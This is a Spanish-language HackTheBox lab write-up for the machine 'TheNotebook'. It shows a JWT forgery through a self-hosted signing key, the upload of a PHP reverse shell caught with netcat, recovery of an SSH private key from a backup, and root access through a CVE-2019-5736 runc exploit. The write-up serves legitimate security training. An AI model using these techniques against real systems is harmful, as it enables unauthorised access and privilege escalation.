---
title: "TheNotebook - HTB Writeup"
layout: single
excerpt: "TheNotebook es una máquina de nivel Medio de HackTheBox. En esta máquina explotamos una implementación insegura de JWT, para luego escalar privilegios mediante una versión vulnerable de Docker."
show_date: true
classes: wide
header:
  teaser: "https://user-images.githubusercontent.com/67548295/128552668-b5780470-5b8b-4fb8-b9fa-bd92cb53ac2d.png"
  teaser_home_page: true
  icon: "assets/images/icons/HackTheBox-icon.png"
categories:
  - Writeup
  - HackTheBox
tags:
  - JWT
  - Misconfiguration
  - Docker
---

![titulo](https://user-images.githubusercontent.com/67548295/128552947-4c4963c9-3f22-4f14-a141-766fe8244b21.png)


# Enumeración

Como siempre empezamos enviando una traza ICMP al equipo para ver si la máquina esta activa y para ver el sistema operativo:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $ping -c 1 10.10.10.230
PING 10.10.10.230 (10.10.10.230) 56(84) bytes of data.
64 bytes from 10.10.10.230: icmp_seq=1 ttl=63 time=66.2 ms

--- 10.10.10.230 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 66.233/66.233/66.233/0.000 ms
```

| Parámetro | Acción |
|:----------|:------:|
| `-c 1` | elegimos que solo queremos enviar 1 traza |

Podemos observar que la máquina está activa y que observando el TTL, concluimos que es una máquina Linux.

Más información sobre la detección de OS mediante TTL [aquí](https://subinsb.com/default-device-ttl-values/).

También puedes hacer uso de mi herramienta [OSidentifier](https://github.com/z3robyte/OSidentifier).

## Nmap

Empezamos la fase de enumeración de puertos, yo usaré la herramienta `Nmap`:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $sudo nmap -p- --open -sS --min-rate 4000 -v -n 10.10.10.230 -sV -sC -oN targeted

[sudo] password for z3r0byte: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-07 09:04 WEST
Scanning 10.10.10.230 [65535 ports]
Discovered open port 22/tcp on 10.10.10.230
Discovered open port 80/tcp on 10.10.10.230
Nmap scan report for 10.10.10.230
Host is up (0.061s latency).
Not shown: 65532 closed ports, 1 filtered port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:df:10:fd:27:a3:fb:d8:36:a7:ed:90:95:33:f5:bf (RSA)
|   256 e7:81:d6:6c:df:ce:b7:30:03:91:5c:b5:13:42:06:44 (ECDSA)
|_  256 c6:06:34:c7:fc:00:c4:62:06:c2:36:0e:ee:5e:bf:6b (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: B2F904D3046B07D05F90FB6131602ED2
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: The Notebook - Your Note Keeper
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds
           Raw packets sent: 65540 (2.884MB) | Rcvd: 65535 (2.621MB)
```

| Parámetro | Acción |
|:----------|:------:|
| `-p-` | Es una forma de especificar que queremos escanear todos los puertos existentes, los 65535 |
| `--open` | Este parámetro hace que nos muestre únicamente los puertos abiertos, que nos omita los filtered |
| `-sS` | Especificamos el tipo de escaneo 'SYN port Scan', que es más rápido y sigiloso que el tipo de escaneo por defecto |
| `--min-rate [valor]` | envia paquetes tan o más rápido que la tasa dada |
| `-v` | Especifica que queremos más 'verbose', es decir, que nos muestre mas información de la convencional |
| `-n` | Quitamos la resolución DNS para que el escaneo vaya más rápido |
| `-sC` | Utiliza un escaneo con una serie de scripts por defecto de nmap |
| `-sV` | Activa la detección de versiones. |
| `-oN [nombre de archivo]` | Exporta los resultados en formato normal, tal cual se ve en el escaneo |

Vemos que tenemos 2 servicios, SSH, y HTTP.

Vamos a enumerar un poco más el servicio HTTP.

Hago uso de la herramienta de whatweb para mostrar algo de información extra del servidor web:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $whatweb http://10.10.10.230/
http://10.10.10.230/ [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.10.230], Title[The Notebook - Your Note Keeper], nginx[1.14.0]
```
# User.txt

Hay varias cosas interesantes, vamos a ver este servicio web desde el navegador:

![navegador1](https://user-images.githubusercontent.com/67548295/128594475-0ccff656-0aca-4393-a06d-309361cacc5e.png)

Parece ser una simple página para tomar notas.

Hay un panel de inicio de sesión y un panel de registro.

Procedo a registrarme:

![grabación](https://user-images.githubusercontent.com/67548295/128594988-2b31cac9-9147-46f0-90f7-27819f7e8bbc.gif)


Ahora que estamos registrados, enumero un poco más la web hasta que encuentro que hay un JWT implementado.

¿Qué? ¿Qué no sabes lo que es un JWT? Bien, te lo explico:

* Un JSON Web Token es un token de acceso estandarizado en el RFC 7519 que permite el intercambio de datos entre dos partes. 
* Contiene toda la información importante sobre una entidad, lo que implica que no hace falta consultar una base de datos ni que la sesión tenga que guardarse en el servidor (sesión sin estado).
* Con este estándar es posible cifrar mensajes cortos, dotarlos de información sobre el remitente y demostrar si este cuenta con los derechos de acceso requeridos. 
* Los propios usuarios solo entran en contacto con el token de manera indirecta: por ejemplo, al introducir el nombre de usuario y la contraseña en una interfaz. 
* La comunicación como tal entre las diferentes aplicaciones se lleva a cabo en el lado del cliente y del servidor.


Una vez entendido, con ayuda del Add-on [Cookie editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) copio el token JWT y me dirijo a https://jwt.io para ver que contiene.

![navegador2](https://user-images.githubusercontent.com/67548295/128595061-a337c779-5f79-45c1-9171-2f8a7f05c8df.png)

---

![navegador3](https://user-images.githubusercontent.com/67548295/128595156-bd38fe1b-4f5c-486e-b227-18ed93f0b5fd.png)

Y me encuentro con esta sorpresa.

Veo 2 cosas interesantes:

1. Se ve que el JWT esta usando una llave privada RSA
2. La etiqueta admin_cap llama la atención

Con lo que veo se me ocurre un vector de ataque:

* Se podría crear una key privada RSA en nuestro equipo y montar un servidor en python para que el token pueda acceder a la key cuando quiera.
* Y editar el token desde la plataforma de jwt.io para cambiar la etiqueta admin_cap de 0 a 1, poner en el campo de private key nuestra clave RSA generada y en la etiqueta 'kid' poner
nuestra ip y el recurso donde esta la key que hemos generado y que esta alojada con nuestro servidor con python.

Hagamos esto!

Primero creamos una clave privada RSA:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $openssl genrsa -out privKey.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
.................................................+++++
....+++++
e is 65537 (0x010001)
```


| Parámetro | Acción |
|:----------|:------:|
| `genrsa` | Genera una clave privada RSA |
| `-out [nombre]` | exporta la clave a un archivo |
| `2048` | Longitud de bits de la clave |

Una vez hecho esto, introducimos la clave en jwt.io en el campo de 'private key':
![image](https://user-images.githubusercontent.com/67548295/128596212-bc6d0d50-9ce9-40d0-9ec2-4da7fb28d774.png)

Ahora editamos la clave con los datos que habiamos previsto antes.

Tiene que quedar así:

![image](https://user-images.githubusercontent.com/67548295/128596442-2b515dbd-ca62-4cad-9d2b-d419e49c6dab.png)

Ahora montamos un servidor en python por el puerto 7070 o el que hayamos definido en el JWT, en el directorio donde hayamos alojado la RSA:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $python3 -m http.server 7070
Serving HTTP on 0.0.0.0 port 7070 (http://0.0.0.0:7070/) ...
```


| Parámetro | Acción |
|:----------|:------:|
| `-m http.server` | Indicamos el modulo http.server que levanta un servidor |
| `7070` | El puerto por el cual operará el servidor |


Una vez hecho esto, copiamos el JWT resultante de la izquierda, nos dirigimos a la web de la máquina, reemplazamos el JWT que haya por el nuestro y recargamos la página:

![grabacion2](https://user-images.githubusercontent.com/67548295/128596810-9c0bd57a-270a-4786-9127-20458ce090ce.gif)

Vemos que ha funcionado, y al cambiar la etiqueta de admin_cap de 0 a 1 ahora tenemos permisos de administrador.

Entro en el panel de administrador que ha aparecido y vemos que tenemos una opción para subir archivos:

![image](https://user-images.githubusercontent.com/67548295/128596980-f325ecae-2446-4c24-b104-d084893c8c35.png)

Intento subir una reverse shell en php de este [repositorio](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) cambiando la IP por la mia.

Y obtenemos shell:

```bash
┌─[z3r0byte@z3r0byte]─[~]
└──╼ $nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.230 45098
Linux thenotebook 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 10:27:55 up 1 day,  5:13,  0 users,  load average: 0.04, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
## User pivoting

Empiezo a enumerar el sistema en busca de credenciales para migrar a otro usuario.

Encuentro un backup comprimido del directorio home en /var/backups:

```bash
www-data@thenotebook:/$ ls -lah /var/backups
total 872K
drwxr-xr-x  2 root root   4.0K Aug  7 06:25 .
drwxr-xr-x 14 root root   4.0K Feb 12 06:52 ..
-rw-r--r--  1 root root    50K Aug  6 06:25 alternatives.tar.0
-rw-r--r--  1 root root    33K Jul 23 14:24 apt.extended_states.0
-rw-r--r--  1 root root   3.6K Feb 24 08:53 apt.extended_states.1.gz
-rw-r--r--  1 root root   3.6K Feb 23 08:58 apt.extended_states.2.gz
-rw-r--r--  1 root root   3.6K Feb 12 06:52 apt.extended_states.3.gz
-rw-r--r--  1 root root    437 Feb 12 06:17 dpkg.diversions.0
-rw-r--r--  1 root root    202 Feb 12 06:17 dpkg.diversions.1.gz
-rw-r--r--  1 root root    172 Feb 12 06:52 dpkg.statoverride.0
-rw-r--r--  1 root root    151 Feb 12 06:52 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   562K Jul 23 14:25 dpkg.status.0
-rw-r--r--  1 root root   160K Jul 23 14:25 dpkg.status.1.gz
-rw-------  1 root root    693 Feb 17 13:18 group.bak
-rw-------  1 root shadow  575 Feb 17 13:18 gshadow.bak
-rw-r--r--  1 root root   4.3K Feb 17 09:02 home.tar.gz
-rw-------  1 root root   1.6K Feb 12 06:24 passwd.bak
-rw-------  1 root shadow 1.0K Feb 12 07:33 shadow.bak
```

Notese el comprimido home.tar.gz

Me lo transfiero a mi equipo y consigo una id_rsa de un usuario del sistema:

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $ tar -xzf home.tar.gz 
┌─[z3r0byte@z3r0byte]─[~/Descargas]
└──╼ $cd home/noah/.ssh/
┌─[z3r0byte@z3r0byte]─[~/Descargas/home/noah/.ssh]
└──╼ $cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXxsED3qq9Pz1LxEN04
HbhhDfFxK+EDWK4ykk0g5MvBQckcxAs31mNnu+UClYLMb4YXGvriwCrtrHo/ulwT
rLymqVzxjEbLUkIgjZNW49ABwi2pDfzoXnij9JK8s3ijIo+w/0RqHzAfgS3Y7t+b
HVo4kvIHT0IXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX0vmL7gr3fQRBndrUD
v4k2zwetxYNt0hjdLDyA+KGWFFeW7ey9ynrMKW2ic2vBucEAUUe+mb0EazO2inhX
rTAQEgTrbO7jNoZEpf4MDRt7DTQ7dRz+k8HG4wIDAQABAoIBAQDIa0b51Ht84DbH
+UQY5+bRB8MHifGWr+4B6m1A7FcHViUwISPCODg6Gp5o3v55LuKxzPYPa/M0BBaf
Q9y29Nx7ce/JPGzAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX0CIi9J7oYqNCZEYs
QALx5jilbzUk0WLAnA/eWs9BkVFpQDTnsSPVWscQLqWk7+zwIqq0v6iN3jPGxA8K
VxGyB2tGqt6jI58oPztpabGBTCmBfh82nT2KNNHfwwmfwZjdsu9I9zvo+e3CXlBZ
vglmvw2DW6l0EwXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXfV6CYIwwO5qK+Jyr
2WWWKla/qaWo8yPQbrEddtOyBS0BP4yL9s86yyK8gPFxpocJrk3esdT7RuKkVCPJ
z2yn8QE6Rg+yWZpPHqkazSZO1eItzQR2mYG2hzPKFtE7evH6JUrnjm5LTKEreco+
8iCuZAcCgXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX6ZCLTuKKhdvuqkKr
JjwmBxv0VN6MDmJ4OhYo1ZR6WiTMYq6kFGCmSCATPl4wbGmwb0ZHb0WBSbj5ErQ+
Uh6he5GMXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXQ=
-----END RSA PRIVATE KEY-----
```
Concretamente una id_rsa del usuario noah.

Probamos a conectarnos y...

```bash
┌─[z3r0byte@z3r0byte]─[~/Descargas/home/noah/.ssh]
└──╼ $ chmod 600 id_rsa && ssh -i id_rsa noah@10.10.10.230
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Aug  7 11:18:59 UTC 2021

  System load:  0.19              Processes:              180
  Usage of /:   46.0% of 7.81GB   Users logged in:        0
  Memory usage: 14%               IP address for ens160:  10.10.10.230
  Swap usage:   0%                IP address for docker0: 172.17.0.1


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

137 packages can be updated.
75 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Aug  7 04:55:00 2021 from 10.10.15.48
noah@thenotebook:~$ 
```
Logramos aacceder como usuario Noah!

Una vez aquí, podemos ver la flag user.txt en el directorio home de Noah:

```txt
noah@thenotebook:~$ cat user.txt 
42XXXXXXXXXXXXXXXXXXXXXXX966
```

# Root.txt

Seguimos enumerando el sistema como el usuario noah y vemos que tenemos un permiso de sudoers:

```bash
noah@thenotebook:~$ sudo -l
Matching Defaults entries for noah on thenotebook:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User noah may run the following commands on thenotebook:
    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
```
Podemos correr esa imagen de docker en especifico.

Pero, ¿que consigo con eso?

No me queda claro e intento enumerar la versión de docker:

```bash
noah@thenotebook:~$ docker --version
Docker version 18.06.0-ce, build 0ffa825
```

Busco exploits asociados a esa versión y encuentro uno.

Concretamente el [CVE-2019-5736](https://nvd.nist.gov/vuln/detail/CVE-2019-5736) que nos permite sobrescribir el binario `runc` del host aprovechando la capacidad 
de ejecutar un comando como root dentro de uno de estos tipos de contenedores.
Esto se puede hacer con un contenedor existente, al que el atacante tenga previamente acceso de escritura, que pueda ser adjuntado con docker exec.

Que es justamente nuestro caso.

Yo utilicé un PoC de este [repositorio](https://github.com/Frichetten/CVE-2019-5736-PoC)

Primero descargamos el main.go del repositorio y cambiamos el comando que se ejecutará en el sistema por el que queramos:

![image](https://user-images.githubusercontent.com/67548295/128599386-8817773b-8403-402e-a289-ad3da4ced657.png)

Después de eso, compilamos el script:

```bash
└──╼ $go build -ldflags "-s -w" main.go && upx main
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   1495040 ->    603796   40.39%   linux/amd64   main                          

Packed 1 file.
```

Los parámetros del go build son para que el archivo resultante pese lo menos posible, para que sea mas rápido de transferir.

Ahora iniciamos un contenedor docker con bash en la máquina víctima con el permiso de sudoers:

```bash
noah@thenotebook:~$ sudo -u root /usr/bin/docker exec -it webapp-dev01 /bin/bash

root@d19d83405fa2:/opt/webapp# 
```

Ahora tranferimos el compilado al contenedor con un servidor en python:

![image](https://user-images.githubusercontent.com/67548295/128600304-033fdbfd-a9f6-47a4-8ae2-979693fcb9cd.png)

Le damos permisos de ejecución al exploit y lo ejecutamos:

```bash
root@d19d83405fa2:/opt/webapp# chmod +x /tmp/exploit && /tmp/exploit

[+] Overwritten /bin/sh successfully

```
Ahora rapidamente entramos a la máquina victima con otra sesión de SSH con la id_rsa que habiamos encontrado previamente.

Y ahora ejecutamos un contenedor docker con el permiso de sudoers, pero ahora con /bin/sh.

Y el comando que habiamos introducido en el exploit se ejecuta en la máquina victima:

![image](https://user-images.githubusercontent.com/67548295/128601422-66dfb3cd-fdcd-4e91-9e12-7009cad405bd.png)

Da ese pequeño error al ejecutar el contenedor con /bin/sh, pero es necesario para que se ejecute el exploit.

Yo habia puesto en el exploit que se asignara permisos SUID a la /bin/bash, vamos a ver si se ha ejecutado:

```bash
noah@thenotebook:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```

Y vemos que sí, hay una 's' en los permisos, eso significa que es SUID.

Una vez aquí ya podemos migrar al usuario Root y ver la flag root.txt

```bash
noah@thenotebook:~$ bash -p
bash-4.4# whoami; id; cat /root/root.txt

root

uid=1000(noah) gid=1000(noah) euid=0(root) groups=1000(noah)

d0140XXXXXXXXXXXXXXXXXXXXXXXX9d0f
```

# Resumen 

Hemos explotado una mala implementación de un JWT para conseguir permisos de administrador en el servicio web, para luego

abusar de un panel de subida de archivos donde hemos subido un archivo php malicioso que nos hacía una reverse shell,

después de esto encontramos un backup del directorio home donde había una id_rsa en texto claro del usuario Noah, con esto

logramos convertirnos en el usuario noah. Por último, abusamos de una vulnerabilidad de una versión de docker que nos permitía

ejecutar comandos en la máquina victima desde un contenedor abusando del binario runc.



